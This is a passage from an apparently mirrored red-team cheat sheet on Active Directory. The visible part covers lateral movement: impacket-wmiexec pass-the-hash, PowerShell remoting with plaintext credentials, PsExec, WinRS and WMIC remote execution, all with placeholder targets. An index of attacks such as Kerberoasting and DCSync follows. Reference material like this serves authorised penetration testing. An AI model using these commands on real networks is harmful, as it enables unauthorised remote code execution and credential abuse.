              <pre><code class="language-bash">impacket-wmiexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-wmiexec -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt; &lt;username&gt;@&lt;target_ip&gt;
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt; &lt;username&gt;@&lt;target_ip&gt;
</code></pre>
              <h3 id="43-from-windows">4.3 From Windows</h3>
              <h4 id="431-dcom-distributed-component-object-model">4.3.1 DCOM (Distributed Component Object Model)
              </h4>
              <p>This technique uses PowerShell&#39;s built-in capabilities to execute commands on remote systems via
                DCOM.</p>
              <ol>
                <li><strong>Verify if DCOM is enabled</strong> on the target machine.</li>
              </ol>
              <pre><code class="language-powershell">Get-ItemProperty -Path &quot;HKLM:\Software\Microsoft\OLE&quot; -Name &quot;DCOMServer&quot;
</code></pre>
              <ol start="2">
                <li><strong>Use the <code>Invoke-Command</code></strong> to Execute Commands via DCOM</li>
              </ol>
              <pre><code class="language-powershell">$targetIP = &quot;&lt;target_ip&gt;&quot;  # Replace with the actual target IP
$username = &quot;&lt;username&gt;&quot;    # Replace with the actual username
$password = &quot;&lt;password&gt;&quot;     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
</code></pre>
              <ol start="3">
                <li>(Optional) We can also try to use DCOM via <code>vmiexec</code></li>
              </ol>
              <pre><code class="language-bash">wmiexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
# or
wmiexec.py &lt;domain&gt;/&lt;username&gt;@&lt;target_ip&gt; -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="432-psexec">4.3.2 PsExec</h4>
              <p>Tool for executing processes on remote systems, particularly useful for obtaining interactive shells.
              </p>
              <pre><code class="language-bash">psexec.exe \\&lt;target_ip&gt; -u &lt;username&gt; -p &lt;password&gt; cmd
</code></pre>
              <h4 id="433-winrm">4.3.3 WinRM</h4>
              <p>Service that allows remote management of Windows systems through the WS-Management protocol; this is
                how
                to establish a remote session:</p>
              <pre><code class="language-powershell">$username = &#39;&lt;username&gt;&#39;;
$password = &#39;&lt;password&gt;&#39;;
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName &lt;target_ip&gt; -Credential $credential;
</code></pre>
              <h4 id="434-winrs">4.3.4 WinRS</h4>
              <p>Command-line tool that allows you to run commands on remote systems.</p>
              <pre><code class="language-powershell">winrs -r:&lt;target_ip&gt; -u:&lt;username&gt; -p:&lt;password&gt; &quot;&lt;command&gt;&quot;
</code></pre>
              <h4 id="435-wmic">4.3.5 WMIC</h4>
              <p>Command-line tool to perform Windows Management Instrumentation (WMI) operations, including executing
                commands remotely.</p>
              <pre><code class="language-powershell">wmic /node:&lt;target_ip&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create &quot;&lt;command&gt;&quot;
</code></pre>

            </div>
          </div>
        </div>

      </div>
    </section><!-- End Cheatsheet Section -->

  </main><!-- End #main -->

  <!-- ======= Index ======= -->
  <div class="index-btn" onclick="toggleIndex()">Index</div>
  <div id="index" class="index">
      <div class="container mt-3">
        <div class="input-group mb-3">
          <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
          <button class="btn btn-primary" type="button" id="search-button">
            <i class="bi bi-search"></i>
          </button>
        </div>
      </div>
      <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
      <div class="section-rose">
        <button class="dropdown-btn">1. <span class="emoji">📜</span> Active Directory Theory
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#11-overview">1.1 Overview</a>
          <a href="#12-authentication">1.2 Authentication</a>
          <a href="#13-credential-storage--hash-dumping">1.3 Credential Storage &amp; Hash Dumping</a>
          <a href="#14-common-attack-vectors">1.4 Common Attack Vectors</a>
          <a href="#15-lateral-movement">1.5 Lateral Movement</a>
          <a href="#16-persistence">1.6 Persistence</a>
        </div>
      </div>

      <div class="section-mint-green">
        <button class="dropdown-btn">2. <span class="emoji">🕵️‍♂️</span> Active Directory Enumeration
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">12.1 Initial Recon with Nmap
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#211-dns-enumeration-port-53">2.1.1 DNS Enumeration (Port 53)</a>
            <a href="#212-kerberos-enumeration-port-88">2.1.2 Kerberos Enumeration (Port 88)</a>
            <a href="#213-ldap-enumeration-port-389636">2.1.3 LDAP Enumeration (Port 389/636)</a>
            <a href="#214-smbnetbios-enumeration-port-445">2.1.4 SMB/NetBIOS Enumeration (Port 445)</a>
            <a href="#215-winrm-enumeration-and-access-port-5985">2.1.5 WinRM Enumeration and Access (Port 5985)</a>
          </div>
          <a href="#22-basic-enumeration">2.2 Basic Enumeration</a>
          <a href="#23-powerview">2.3 PowerView</a>
          <a href="#24-service-principal-names-spn-enumeration">2.4 Service Principal Names (SPN) Enumeration</a>
          <a href="#25-object-permissions-enumeration">2.5 Object Permissions Enumeration</a>
          <a href="#26-domain-shares-enumeration">2.6 Domain Shares Enumeration</a>
          <a href="#27-bloodhound--sharphound">2.7 BloodHound &amp; SharpHound</a>
          <a href="#28-extracting-and-cracking-password-hashes">2.8 Extracting and Cracking Password Hashes</a>
          <a href="#29-ms-rprn-print-spooler-service-exploitation">2.9 MS-RPRN Print Spooler Service Exploitation</a>
          <a href="#210-common-spns-for-service-accounts">2.10 Common SPNs for Service Accounts</a>
          <button class="dropdown-btn">2.11 GPP Passwords Abuse (Group Policy Preferences)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#2111-gpp-main-method-for-extraction">2.11.1 GPP Main Method for Extraction</a>
            <a href="#2112-impacket-get-gpppassword">2.11.2 Impacket-Get-GPPPassword</a>
            <a href="#2113-smb-share-sysvol">2.11.3 SMB Share-SYSVOL</a>
            <a href="#2114-crackmapexec">2.11.4 CrackMapExec</a>
          </div>
          <button class="dropdown-btn">2.12 Scripts (adPEAS)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#2121-importing-the-module">2.12.1 Importing the Module</a>
            <a href="#2122-basic-usage">2.12.2 Basic Usage</a>
            <a href="#2123-module-specific-usage">2.12.3 Module-Specific Usage</a>
          </div>
          <button class="dropdown-btn">2.13 Group Managed Service Accounts (gMSAs) Abuse
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">2.13.1 Identifying Group Managed Service Accounts (gMSAs)
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#21311-manual-discovery-of-gmsas">2.13.1.1 Manual Discovery of gMSAs</a>
              <a href="#21312-automated-discovery-with-bloodhound">2.13.1.2 Automated Discovery with BloodHound</a>
            </div>
            <button class="dropdown-btn">12.13.2 GMSA Password Retrieval with GMSAPasswordReader
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#21321-usage">2.13.2.1 Usage</a>
              <a href="#21322-additional-notes">2.13.2.2 Additional Notes</a>
            </div>
            <a href="#2133-alternative-commands">2.13.3 Alternative Commands</a>
          </div>
          <a href="#212-group-policy-object-gpo-abuse">2.12 Group Policy Object (GPO) Abuse</a>
        </div>
      </div>

      <div class="section-lemon">
        <button class="dropdown-btn">3. <span class="emoji">👾</span> Active Directory Attacking
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#31-as-rep-roasting">3.1 AS-REP Roasting</a>
          <a href="#32-kerberoasting">3.2 Kerberoasting</a>
          <a href="#33-silver-tickets">3.3 Silver Tickets</a>
          <a href="#34-golden-tickets">3.4 Golden Tickets</a>
          <a href="#35-domain-controller-synchronization-dc-sync">3.5 Domain Controller Synchronization (DC Sync)</a>
          <a href="#36-cached-ad-credentials">3.6 Cached AD Credentials</a>
          <a href="#37-ntlm-authentication">3.7 NTLM Authentication</a>
          <a href="#38-kerberos-authentication">3.8 Kerberos Authentication</a>
          <button class="dropdown-btn">3.9 Password Attacks
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">3.9.1 Spraying Creds with Script
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#3911-running-the-script">3.9.1.1 Running the Script</a>
              <a href="#3912-source-code-of-the-script">3.9.1.2 Source Code of the Script</a>
            </div>
            <a href="#392-authenticating-using-directoryentry">3.9.2. Authenticating using DirectoryEntry</a>
            <button class="dropdown-btn">3.9.3 Using CrackMapExec
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#3931-basic-commands">3.9.3.1 Basic Command</a>
              <a href="#3932-additional-commands">3.9.3.2 Additional Commands</a>
              <a href="#3933-possible-services-to-test">3.9.3.3 Possible Services to Test</a>
            </div>
            <a href="#394-using-kerbrute">3.9.4 Using kerbrute</a>
          </div>
          <a href="#310-shadow-copies">3.10 Shadow Copies</a>
          <a href="#311-constrained-delegation-attack">3.11 Constrained Delegation Attack</a>
        </div>
      </div>

      <div class="section-blush">
        <button class="dropdown-btn">4. <span class="emoji">↔️</span> Active Directory Lateral Movement
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#41-techniques-and-preparation">4.1 Techniques and Preparation</a>
          <button class="dropdown-btn">4.2 From Kali
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#421-evil-winrm">4.2.1 Evil-WinRM</a>
            <a href="#422-psexec">4.2.2 PsExec</a>
            <a href="#423-vmiexec">4.2.3 VMIExec</a>
          </div>
          <button class="dropdown-btn">4.3 From Windows
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#431-dcom-distributed-component-object-model">4.3.1 DCOM (Distributed Component Object Model)</a>
            <a href="#432-psexec">4.3.2 PsExec</a>
            <a href="#433-winrm">4.3.3 WinRM</a>
            <a href="#434-winrs">4.3.4 WinRS</a>
            <a href="#435-wmic">4.3.5 WMIC</a>
          </div>
        </div>
      </div>

    </div>
    <!-- End Index -->

    <!-- ======= Footer ======= -->
    <footer id="footer">
      <div class="container">
        <div class="credits">
          <p>
            &copy; Emmanuel Solis<br>
            Pentester &amp; Red Teamer
          </p>
        </div>
      </div>
    </footer><!-- End  Footer -->

    <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
        class="bi bi-arrow-up-short"></i></a>

    <!-- Vendor JS Files -->
    <script src="vendor/purecounter/purecounter.js"></script>
    <script src="vendor/aos/aos.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="vendor/glightbox/js/glightbox.min.js"></script>
    <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
    <script src="vendor/swiper/swiper-bundle.min.js"></script>
    <script src="vendor/typed.js/typed.min.js"></script>
    <script src="vendor/waypoints/noframework.waypoints.js"></script>
    <script src="vendor/php-email-form/validate.js"></script>

    <!-- Prism JS -->
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-c.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-cpp.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>

    <!-- Template Main JS File -->
    <script src="js/main.js"></script>

    <!-- Prism JS Additional Keywords-->
    <script>
      Prism.languages.bash = Prism.languages.extend('bash', {
        'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
      });
    </script>
    <script>
      Prism.languages.powershell = Prism.languages.extend('powershell', {
        'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
      });
    </script>

    <script>
      let allOpen = false; // Track the state of the dropdowns

      function toggleIndex() {
        const index = document.getElementById('index');
        index.classList.toggle('open');
      }

      function toggleAll() {
        const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
        const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');

        // Set the new state based on the current state
        allOpen = !allOpen;

        for (let i = 0; i < dropdownContainers.length; i++) {
          const container = dropdownContainers[i];
          const btn = buttons[i];
          if (allOpen) {
            container.style.display = 'block';
            btn.classList.add('active');
          } else {
            container.style.display = 'none';
            btn.classList.remove('active');
          }
        }
      }

      const dropdownBtns = document.getElementsByClassName("dropdown-btn");
      for (let i = 0; i < dropdownBtns.length; i++) {
        dropdownBtns[i].addEventListener("click", function () {
          this.classList.toggle("active");
          const dropdownContent = this.nextElementSibling;
          if (dropdownContent.style.display === "block") {
            dropdownContent.style.display = "none";
          } else {
            dropdownContent.style.display = "block";
          }
        });
      }

      const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
      for (let i = 0; i < nestedDropdownBtns.length; i++) {
        nestedDropdownBtns[i].addEventListener("click", function () {
          this.classList.toggle("active");
          const nestedDropdownContent = this.nextElementSibling;
          if (nestedDropdownContent.style.display === "block") {
            nestedDropdownContent.style.display = "none";
          } else {
            nestedDropdownContent.style.display = "block";
          }
        });
      }

      setTimeout(function () {
        var alert = document.querySelector('.alert-warning');
        if (alert) {
          var bootstrapAlert = new bootstrap.Alert(alert);
          bootstrapAlert.close();
        }
      }, 7000); // 7 seconds

      // Check if there's any saved state and apply it
      window.addEventListener('DOMContentLoaded', (event) => {
        // Load the saved state for checkboxes
        const checkboxes = document.querySelectorAll('ul li input[type="checkbox"]');
        checkboxes.forEach((checkbox, index) => {
          const isChecked = sessionStorage.getItem(`checkbox-${index}`) === 'true';
          checkbox.checked = isChecked;
          toggleCheckedClass(checkbox);
        });
      });

      // Toggle the 'checked' class and save state
      function toggleCheckedClass(checkbox) {
        const listItem = checkbox.parentElement;
        if (checkbox.checked) {
          listItem.classList.add('checked');
        } else {
          listItem.classList.remove('checked');
        }
      }

      // Attach event listeners to checkboxes to save state on change
      document.querySelectorAll('ul li input[type="checkbox"]').forEach((checkbox, index) => {
        checkbox.addEventListener('change', () => {
          sessionStorage.setItem(`checkbox-${index}`, checkbox.checked);
          toggleCheckedClass(checkbox);
        });
      });

      function removeHighlights(element) {
        element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
      }

      function highlightTerm(element, term) {
        const regex = new RegExp(`(${term})`, 'gi');
        element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
      }

      document.getElementById("search-input").addEventListener("input", function () {
        const searchTerm = this.value.toLowerCase();
        const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
        let anyMatch = false;

        headings.forEach((heading) => {
          const text = heading.textContent.toLowerCase();
          const sectionContent = [];

          // Get all sibling elements until the next heading
          let sibling = heading.nextElementSibling;
          while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
            sectionContent.push(sibling);
            sibling = sibling.nextElementSibling;
          }

          // Remove existing highlights
          removeHighlights(heading);

          // Only show headings and content that match the search term
          if (text.includes(searchTerm)) {
            heading.style.display = "";
            sectionContent.forEach((elem) => (elem.style.display = ""));
            if (searchTerm) {
              highlightTerm(heading, searchTerm);
            }

            anyMatch = true;
          } else {
            // Hide non-matching headings and content
            heading.style.display = "none";
            sectionContent.forEach((elem) => (elem.style.display = "none"));
          }
        });

        const noMatchMessage = document.getElementById("no-match-message");
        if (!anyMatch) {
          if (!noMatchMessage) {
            const message = document.createElement("p");
            message.id = "no-match-message";
            message.className = "text-danger mt-3";
            message.textContent = "No matches found.";
            document.querySelector(".cheatsheet-content").appendChild(message);
          }
        } else if (noMatchMessage) {
          noMatchMessage.remove();
        }
      });

      function toggleSubmenu(event) {
        event.preventDefault(); // Prevents navigation
        const submenu = event.currentTarget.nextElementSibling;
        const arrow = event.currentTarget.querySelector('.arrow');

        submenu.classList.toggle('open'); // Toggle the submenu visibility
        // Rotate the arrow based on whether the submenu is open
        if (submenu.classList.contains('open')) {
            arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
        } else {
            arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
        }
      }
    </script>

</body>


<!-- Mirrored from www.emmanuelsolis.com/ad_pentesting.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:43:53 GMT -->
</html>